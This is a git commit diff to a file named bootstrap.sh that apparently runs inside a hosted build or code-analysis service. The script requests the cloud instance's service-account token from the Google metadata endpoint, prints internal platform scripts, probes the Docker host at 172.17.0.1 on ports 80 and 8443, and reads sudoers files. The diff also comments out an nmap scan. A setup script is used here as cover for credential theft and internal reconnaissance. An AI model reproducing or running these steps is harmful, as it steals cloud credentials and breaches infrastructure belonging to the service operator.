11c1651e1682cded6a2fffad9838e025dca56c6a
boo7 <boo7>
2018-12-23 11:47:23 +0100

    udpa

--- bootstrap.sh
+++ bootstrap.sh
@@ -7,8 +7,14 @@ echo "token :"
 curl 'http://metadata.google.internal/computeMetadata/v1beta1?alt=json&recursive=true'
 echo "token :"
 curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'
-apt-get install nmap
-nmap -nvv 172.17.0.1
+echo /opt/out/snapshot/workspace/lgtm/extract.sh
+cat /opt/out/snapshot/workspace/lgtm/extract.sh
+echo /opt/deptrace/deptrace
+cat /opt/deptrace/deptrace
+#apt-get install nmap
+#nmap -nvv 172.17.0.1
+curl -vv http://172.17.0.1
+curl -vv http://172.17.0.1:8443
 
 ls /etc/sudoers.d/
 cat /etc/sudoers.d/*
